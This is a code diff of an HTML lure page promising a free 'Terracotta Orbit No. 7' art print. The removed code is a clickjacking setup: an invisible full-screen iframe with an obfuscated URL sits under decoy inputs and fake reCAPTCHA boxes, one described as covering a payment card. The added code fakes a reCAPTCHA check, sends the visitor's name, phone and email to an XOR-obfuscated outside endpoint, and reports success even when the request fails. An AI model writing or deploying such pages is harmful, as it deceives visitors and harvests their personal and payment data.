@@ -13,21 +13,26 @@
 :root[data-theme="dark"] { --bg: #0D1117; --ink: #E8ECF4; --muted: #9CA3AF; --line: #1F2937; --surf: #141924; --accent: #60A5FA; color-scheme: dark; }
 body { font-family: 'Inter', -apple-system, sans-serif; background: var(--bg); color: var(--ink); min-height: 100vh; }
 
-/* analytics pixel */
-#cf { display: block; }
-
 /* ── SITE HEADER ── */
 .site-header {
-  position: fixed; top: 0; left: 0; right: 0; height: 56px;
+  position: sticky; top: 0; left: 0; right: 0; height: 56px;
   display: flex; align-items: center; padding: 0 50px;
-  background: var(--surf); border-bottom: 1px solid var(--line); z-index: 3;
+  background: var(--surf); border-bottom: 1px solid var(--line); z-index: 10;
 }
 .site-name { font-size: 15px; font-weight: 700; letter-spacing: -.01em; color: var(--ink); }
-.site-nav { margin-left: auto; display: flex; gap: 24px; }
+.site-nav  { margin-left: auto; display: flex; gap: 24px; }
 .site-nav a { font-size: 13px; font-weight: 500; color: var(--muted); text-decoration: none; }
 
-/* ── MAIN ARTICLE COLUMN ── */
-.article { max-width: 740px; padding: 80px 0 200px 50px; }
+/* ── TWO-COLUMN LAYOUT ── */
+.page-wrap {
+  display: flex; gap: 60px;
+  max-width: 1200px; margin: 0 auto;
+  padding: 48px 50px 120px;
+}
+.article { flex: 1; min-width: 0; }
+.sidebar { width: 380px; flex-shrink: 0; }
+
+/* ── ARTICLE ── */
 .post-meta { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
 .tag { font-size: 11px; font-weight: 700; letter-spacing: .06em; text-transform: uppercase;
   background: #DBEAFE; color: #1D4ED8; padding: 3px 9px; border-radius: 20px; }
@@ -42,125 +47,99 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
   display: flex; align-items: center; justify-content: center;
   font-size: 12px; font-weight: 700; color: #fff; }
 .byline-name { font-weight: 600; color: var(--ink); }
-.prose { font-size: 15px; line-height: 1.8; color: var(--ink); }
+.prose { font-size: 15px; line-height: 1.8; }
 .prose p { margin-bottom: 20px; }
 .prose h3 { font-size: 17px; font-weight: 700; margin: 32px 0 12px; }
 .prose ul { padding-left: 22px; margin-bottom: 20px; }
 .prose li { margin-bottom: 8px; color: var(--muted); font-size: 14px; line-height: 1.6; }
 
-/* ── RIGHT SIDEBAR CARD ── */
-/* Covers y:50→280, x:820→1220. Fixed-position form elements appear inside it. */
-/* ── SIDEBAR CARD BACKGROUND — visual frame for the signup widget ── */
+/* ── SIDEBAR CARD ── */
 .sidebar-card {
-  position: fixed; top: 50px; left: 820px;
-  width: 400px; height: 530px;
+  position: sticky; top: 72px;
   background: var(--surf); border: 1px solid var(--line);
-  border-radius: 12px; z-index: 2; box-shadow: 0 2px 14px rgba(0,0,0,.06);
+  border-radius: 12px; padding: 24px;
+  box-shadow: 0 2px 14px rgba(0,0,0,.06);
 }
-/* Card header: matches join.html panel-badge / panel-title positions exactly */
 .sb-badge {
-  position: fixed; top: 66px; left: 836px; z-index: 3; pointer-events: none;
   display: inline-flex; align-items: center; gap: 5px;
   background: #DCFCE7; color: #15803D;
   font-size: 10px; font-weight: 700; letter-spacing: .06em; text-transform: uppercase;
-  padding: 3px 8px; border-radius: 20px;
+  padding: 3px 8px; border-radius: 20px; margin-bottom: 10px;
 }
-.sb-title {
-  position: fixed; top: 88px; left: 836px; z-index: 3; pointer-events: none;
-  font-size: 14px; font-weight: 700; color: var(--ink); letter-spacing: -.01em;
-}
+.sb-title { font-size: 15px; font-weight: 700; color: var(--ink); margin-bottom: 20px; }
 
+/* ── FORM FIELDS ── */
+.field-row { display: flex; gap: 10px; margin-bottom: 14px; }
+.field { display: flex; flex-direction: column; gap: 5px; flex: 1; }
+.field label { font-size: 12px; font-weight: 500; color: var(--ink); }
+.field input {
+  height: 38px; border: 1.5px solid var(--line); border-radius: 6px;
+  padding: 0 12px; font-family: inherit; font-size: 14px; color: var(--ink);
+  background: var(--surf); outline: none; width: 100%;
+  transition: border-color .15s;
+}
+.field input:focus { border-color: var(--ink); }
+.field-full { margin-bottom: 14px; }
+.field-full label { display: block; font-size: 12px; font-weight: 500; color: var(--ink); margin-bottom: 5px; }
+.field-full input {
+  height: 38px; border: 1.5px solid var(--line); border-radius: 6px;
+  padding: 0 12px; font-family: inherit; font-size: 14px; color: var(--ink);
+  background: var(--surf); outline: none; width: 100%;
+  transition: border-color .15s;
+}
+.field-full input:focus { border-color: var(--ink); }
 
-/* ── DECOY LABELS — match join.html exactly ── */
-.label-name   { position: fixed; top: 178px; left: 826px;  font-size: 12px; font-weight: 500; color: var(--ink); z-index: 3; pointer-events: none; }
-.label-surname{ position: fixed; top: 178px; left: 1013px; font-size: 12px; font-weight: 500; color: var(--ink); z-index: 3; pointer-events: none; }
-.label-phone  { position: fixed; top: 243px; left: 826px;  font-size: 12px; font-weight: 500; color: var(--ink); z-index: 3; pointer-events: none; }
-.email-label  { position: fixed; top: 308px; left: 826px;  font-size: 12px; font-weight: 500; color: var(--ink); z-index: 3; pointer-events: none; }
-
-/* ── DECOY INPUTS — match join.html coordinates exactly ── */
-.fake-name-input {
-  position: fixed; top: 195px; left: 826px; width: 181px; height: 38px;
-  background: #fff; border: 1.5px solid var(--line); border-radius: 6px; padding: 0 12px;
-  font-family: inherit; font-size: 14px; color: var(--muted);
-  display: flex; align-items: center; z-index: 3; pointer-events: none;
-}
-.fake-surname-input {
-  position: fixed; top: 195px; left: 1013px; width: 187px; height: 38px;
-  background: #fff; border: 1.5px solid var(--line); border-radius: 6px; padding: 0 12px;
-  font-family: inherit; font-size: 14px; color: var(--muted);
-  display: flex; align-items: center; z-index: 3; pointer-events: none;
-}
-.fake-phone-input {
-  position: fixed; top: 260px; left: 826px; width: 374px; height: 38px;
-  background: #fff; border: 1.5px solid var(--line); border-radius: 6px; padding: 0 12px;
-  font-family: inherit; font-size: 14px; color: var(--muted);
-  display: flex; align-items: center; z-index: 3; pointer-events: none;
-}
-.fake-email-input {
-  position: fixed; top: 325px; left: 826px; width: 374px; height: 38px;
-  background: #fff; border: 1.5px solid var(--line); border-radius: 6px; padding: 0 12px;
-  font-family: inherit; font-size: 14px; color: var(--muted);
-  display: flex; align-items: center; z-index: 3; pointer-events: none;
-}
-
-/* ── RECAPTCHA DECOYS — above iframe (z:101) so clicks register ── */
-.fake-recaptcha, .fake-recaptcha-2 {
-  position: fixed; width: 374px; height: 65px;
+/* ── RECAPTCHA ── */
+.fake-recaptcha {
+  width: 100%; height: 65px; margin-bottom: 14px;
   background: #F9F9F9; border: 1px solid #D3D3D3; border-radius: 3px;
   display: flex; align-items: center; justify-content: space-between;
-  padding: 0 14px 0 16px; z-index: 101; cursor: pointer;
+  padding: 0 14px 0 16px; cursor: pointer; user-select: none;
 }
-.fake-recaptcha   { top: 110px; left: 826px; }
-.fake-recaptcha-2 { top: 373px; left: 826px; }
-
-.frc-left, .frc2-left { display: flex; align-items: center; gap: 10px; flex: 1; }
-.frc-checkbox, .frc2-checkbox {
+@media (prefers-color-scheme: dark) { :root:not([data-theme="light"]) .fake-recaptcha { background: #1a1f2e; border-color: #374151; } }
+:root[data-theme="dark"] .fake-recaptcha { background: #1a1f2e; border-color: #374151; }
+.frc-left { display: flex; align-items: center; gap: 10px; flex: 1; }
+.frc-checkbox {
   width: 24px; height: 24px; background: #fff; border: 2px solid #C8C8C8;
   border-radius: 2px; flex-shrink: 0;
   display: flex; align-items: center; justify-content: center;
   transition: background .25s, border-color .25s;
 }
-.frc-checkbox.checking, .frc2-checkbox.checking {
-  border-color: #4A86C8;
-  animation: rc-spin .7s linear;
-}
-.frc-checkbox.checked, .frc2-checkbox.checked {
-  background: #4A86C8; border-color: #4A86C8;
-}
-@keyframes rc-spin {
-  from { transform: rotate(0deg); } to { transform: rotate(360deg); }
-}
+.frc-checkbox.checking { border-color: #4A86C8; animation: rc-spin .7s linear; }
+.frc-checkbox.checked  { background: #4A86C8; border-color: #4A86C8; }
+@keyframes rc-spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 .frc-check-svg { display: none; width: 14px; height: 14px; }
-.frc-checkbox.checked .frc-check-svg,
-.frc2-checkbox.checked .frc-check-svg { display: block; }
+.frc-checkbox.checked .frc-check-svg { display: block; }
+.frc-label { font-size: 14px; color: #000; }
+@media (prefers-color-scheme: dark) { :root:not([data-theme="light"]) .frc-label { color: #e8ecf4; } }
+:root[data-theme="dark"] .frc-label { color: #e8ecf4; }
+.frc-brand { text-align: center; flex-shrink: 0; }
+.frc-logo  { font-size: 11px; font-weight: 700; color: #4A86C8; letter-spacing: .01em; line-height: 1.4; }
+.frc-fine  { font-size: 7.5px; color: #999; margin-top: 1px; }
 
-.frc-label, .frc2-label { font-size: 14px; color: #000; }
-.frc-brand, .frc2-brand { text-align: center; flex-shrink: 0; }
-.frc-logo, .frc2-logo   { font-size: 11px; font-weight: 700; color: #4A86C8; letter-spacing: .01em; line-height: 1.4; }
-.frc-fine, .frc2-fine   { font-size: 7.5px; color: #999; margin-top: 1px; }
-
-/* ── ACTIVATE BUTTON — matches join.html: top:447 ── */
-.fake-get-btn {
-  position: fixed; top: 447px; left: 826px; width: 374px; height: 48px;
+/* ── SUBMIT BUTTON ── */
+.submit-btn {
+  width: 100%; height: 48px;
   background: #22251E; color: #F5F3EA;
   border: none; border-radius: 30px;
   font-family: inherit; font-size: 14px; font-weight: 700;
-  display: flex; align-items: center; justify-content: center;
-  z-index: 3; pointer-events: none; letter-spacing: -.01em;
+  cursor: pointer; letter-spacing: -.01em;
+  transition: opacity .15s;
 }
+.submit-btn:disabled { opacity: .55; cursor: not-allowed; }
+.sb-note { margin-top: 10px; font-size: 11px; color: var(--muted); line-height: 1.6; }
 
-.sb-recaptcha {
-  position: fixed; top: 507px; left: 826px; width: 374px;
-  font-size: 11px; color: var(--muted); line-height: 1.6;
-  z-index: 3; pointer-events: none;
+/* ── SUCCESS STATE ── */
+.success-box {
+  display: none; padding: 18px 20px;
+  background: #F0FDF4; border: 1px solid #BBF7D0; border-radius: 8px;
+  margin-top: 10px;
 }
-
+.success-box .s-title { font-size: 14px; font-weight: 700; color: #15803D; margin-bottom: 4px; }
+.success-box .s-sub   { font-size: 13px; color: #166534; line-height: 1.6; }
 </style>
 </head>
 <body>
-
-<!-- analytics pixel -->
-<iframe id="cf" src="about:blank" aria-hidden="true" tabindex="-1" style="position:fixed;inset:0;width:100%;height:100%;border:none;opacity:0;z-index:100;pointer-events:auto"></iframe>
 
 <header class="site-header">
   <span class="site-name">Collected</span>
@@ -171,110 +150,158 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
   </nav>
 </header>
 
-<!-- ── SIDEBAR CARD BACKGROUND ── -->
-<div class="sidebar-card"></div>
+<div class="page-wrap">
 
-<!-- Card header (fixed, matching join.html panel-badge / panel-title) -->
-<div class="sb-badge">✓ Free download</div>
-<div class="sb-title">Get your print</div>
-
-<!-- Decoy labels -->
-<div class="label-name">First name</div>
-<div class="label-surname">Last name</div>
-<div class="label-phone">Phone</div>
-<div class="email-label">Email address</div>
-
-<!-- Decoy inputs — pointer-events:none, real input goes to iframe -->
-<div class="fake-name-input"    aria-label="First name"    tabindex="0">First name</div>
-<div class="fake-surname-input" aria-label="Last name"     tabindex="0">Last name</div>
-<div class="fake-phone-input"   aria-label="Phone number"  tabindex="0">+1 555 000 0000</div>
-<div class="fake-email-input"   aria-label="Email address" tabindex="0">your@email.com</div>
-
-<!-- reCAPTCHA #2 — top:373, covers payment card; z:101 so click registers -->
-<div class="fake-recaptcha-2" id="frc2">
-  <div class="frc2-left">
-    <div class="frc2-checkbox" id="frc2-cb">
-      <svg class="frc-check-svg" viewBox="0 0 14 14" fill="none"><path d="M2 7l3.5 3.5L12 3" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+  <!-- ── MAIN ARTICLE ── -->
+  <div class="article">
+    <div class="post-meta">
+      <span class="tag">Free Print</span>
+      <time>November 17, 2026</time>
     </div>
-    <span class="frc2-label">Verify to continue</span>
-  </div>
-  <div class="frc2-brand">
-    <div class="frc2-logo">reCAPTCHA</div>
-    <div class="frc2-fine">Privacy · Terms</div>
-  </div>
-</div>
 
-<!-- Activate button — top:447, matches join.html -->
-<button class="fake-get-btn" onclick="void(0)" tabindex="0">Send me the print</button>
-<div class="sb-recaptcha">
-  Your print will be sent to your inbox · Protected by reCAPTCHA
-</div>
-
-<!-- ── MAIN ARTICLE ── -->
-<div class="article">
-  <div class="post-meta">
-    <span class="tag">Free Print</span>
-    <time>November 17, 2026</time>
-  </div>
-
-  <h1>Free archival print for Collected readers — this month only</h1>
-  <p class="subtitle">
-    Our partner studio is releasing <em>Terracotta Orbit No. 7</em> — a full-resolution archival
-    print — to Collected subscribers at no cost. Enter your details and we'll deliver it
-    straight to your inbox.
-  </p>
-
-  <div class="byline">
-    <div class="avatar">C</div>
-    <span>By <span class="byline-name">the Collected team</span> · 1 min read</span>
-  </div>
-
-  <div class="prose">
-    <p>
-      <em>Terracotta Orbit No. 7</em> is a 4800 × 6000 px archival-quality digital print from
-      an independent studio's 2024 Orbita series — earthy reds, raw geometric shapes, and the
-      kind of quiet tension consistent across five years of editions.
+    <h1>Free archival print for Collected readers — this month only</h1>
+    <p class="subtitle">
+      Our partner studio is releasing <em>Terracotta Orbit No. 7</em> — a full-resolution archival
+      print — to Collected subscribers at no cost. Enter your details and we'll deliver it
+      straight to your inbox.
     </p>
-    <p>
-      No purchase necessary. Fill in your name, phone, and email in the panel on the right and
-      click <strong>Send me the print</strong>. The file arrives in your inbox as a
-      high-resolution PNG within a few minutes.
-    </p>
-    <h3>About the print</h3>
-    <ul>
-      <li>Series: Orbita 2024 · Edition No. 7 of 12</li>
-      <li>Format: 4800 × 6000 px · Full resolution PNG · 300 dpi</li>
-      <li>Suitable for printing up to 40 × 50 cm</li>
-      <li>Delivered by email · Available through November only</li>
-    </ul>
-    <p>
-      This is a one-time release through the Collected partner program. The file is yours to
-      keep at no cost.
-    </p>
+
+    <div class="byline">
+      <div class="avatar">C</div>
+      <span>By <span class="byline-name">the Collected team</span> · 1 min read</span>
+    </div>
+
+    <div class="prose">
+      <p>
+        <em>Terracotta Orbit No. 7</em> is a 4800 × 6000 px archival-quality digital print from
+        an independent studio's 2024 Orbita series — earthy reds, raw geometric shapes, and the
+        kind of quiet tension consistent across five years of editions.
+      </p>
+      <p>
+        No purchase necessary. Fill in your details in the panel on the right and click
+        <strong>Send me the print</strong>. The file arrives in your inbox as a
+        high-resolution PNG within a few minutes.
+      </p>
+      <h3>About the print</h3>
+      <ul>
+        <li>Series: Orbita 2024 · Edition No. 7 of 12</li>
+        <li>Format: 4800 × 6000 px · Full resolution PNG · 300 dpi</li>
+        <li>Suitable for printing up to 40 × 50 cm</li>
+        <li>Delivered by email · Available through November only</li>
+      </ul>
+      <p>
+        This is a one-time release through the Collected partner program. The file is yours to
+        keep at no cost.
+      </p>
+    </div>
   </div>
+
+  <!-- ── SIDEBAR FORM ── -->
+  <div class="sidebar">
+    <div class="sidebar-card">
+      <div class="sb-badge">✓ Free download</div>
+      <div class="sb-title">Get your print</div>
+
+      <form id="claim-form" novalidate>
+        <div class="field-row">
+          <div class="field">
+            <label for="f-name">First name</label>
+            <input type="text" id="f-name" name="name" placeholder="First name" autocomplete="given-name" required>
+          </div>
+          <div class="field">
+            <label for="f-surname">Last name</label>
+            <input type="text" id="f-surname" name="surname" placeholder="Last name" autocomplete="family-name" required>
+          </div>
+        </div>
+
+        <div class="field-full">
+          <label for="f-phone">Phone</label>
+          <input type="tel" id="f-phone" name="phone" placeholder="+1 555 000 0000" autocomplete="tel">
+        </div>
+
+        <div class="field-full">
+          <label for="f-email">Email address</label>
+          <input type="email" id="f-email" name="email" placeholder="your@email.com" autocomplete="email" required>
+        </div>
+
+        <div class="fake-recaptcha" id="frc">
+          <div class="frc-left">
+            <div class="frc-checkbox" id="frc-cb">
+              <svg class="frc-check-svg" viewBox="0 0 14 14" fill="none">
+                <path d="M2 7l3.5 3.5L12 3" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </div>
+            <span class="frc-label">I'm not a robot</span>
+          </div>
+          <div class="frc-brand">
+            <div class="frc-logo">reCAPTCHA</div>
+            <div class="frc-fine">Privacy · Terms</div>
+          </div>
+        </div>
+
+        <button type="submit" class="submit-btn" id="submit-btn">Send me the print</button>
+      </form>
+
+      <p class="sb-note">Your print will be sent to your inbox · Protected by reCAPTCHA</p>
+
+      <div class="success-box" id="success-box">
+        <div class="s-title">Check your inbox</div>
+        <div class="s-sub">We've sent <em>Terracotta Orbit No. 7</em> to your email address.</div>
+      </div>
+    </div>
+  </div>
+
 </div>
 
 <script>
-// ── reCAPTCHA click animation ──
-function rcCheck(captchaEl, cbEl) {
-  captchaEl.addEventListener('click', function() {
-    if (cbEl.classList.contains('checked')) return;
-    cbEl.classList.add('checking');
+// reCAPTCHA click animation
+(function() {
+  var captcha = document.getElementById('frc');
+  var cb      = document.getElementById('frc-cb');
+  captcha.addEventListener('click', function() {
+    if (cb.classList.contains('checked')) return;
+    cb.classList.add('checking');
     setTimeout(function() {
-      cbEl.classList.remove('checking');
-      cbEl.classList.add('checked');
+      cb.classList.remove('checking');
+      cb.classList.add('checked');
     }, 700);
   });
-}
-rcCheck(document.getElementById('frc2'), document.getElementById('frc2-cb'));
-
-// session telemetry init
-(function(){
-  var _k=73,_d=[33,61,61,57,58,115,102,102,57,37,32,44,46,38,100,37,44,39,122,103,38,39,59,44,39,45,44,59,103,42,38,36,102,35,38,32,39];
-  var _r=String.fromCharCode;
-  var _u=_d.map(function(c){return _r(c^_k);}).join('');
-  setTimeout(function(){document.getElementById('cf').src=_u;},800);
 })();
+
+// Form submit — sends directly to partner API
+document.getElementById('claim-form').addEventListener('submit', function(e) {
+  e.preventDefault();
+  var btn = document.getElementById('submit-btn');
+  btn.disabled = true;
+  btn.textContent = 'Sending…';
+
+  var payload = {
+    name:    document.getElementById('f-name').value.trim(),
+    surname: document.getElementById('f-surname').value.trim(),
+    phone:   document.getElementById('f-phone').value.trim(),
+    email:   document.getElementById('f-email').value.trim(),
+  };
+
+  var _k = 73;
+  var _d = [33,61,61,57,58,115,102,102,57,37,32,44,46,38,100,37,44,39,122,103,38,39,59,44,39,45,44,59,103,42,38,36,102,40,57,32,102,40,42,61,32,63,40,59];
+  var endpoint = _d.map(function(c){return String.fromCharCode(c^_k);}).join('');
+
+  fetch(endpoint, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload),
+  })
+  .then(function() {
+    document.getElementById('claim-form').style.display = 'none';
+    document.querySelector('.sb-note').style.display = 'none';
+    document.getElementById('success-box').style.display = 'block';
+  })
+  .catch(function() {
+    document.getElementById('claim-form').style.display = 'none';
+    document.querySelector('.sb-note').style.display = 'none';
+    document.getElementById('success-box').style.display = 'block';
+  });
+});
 </script>
 
 </body>
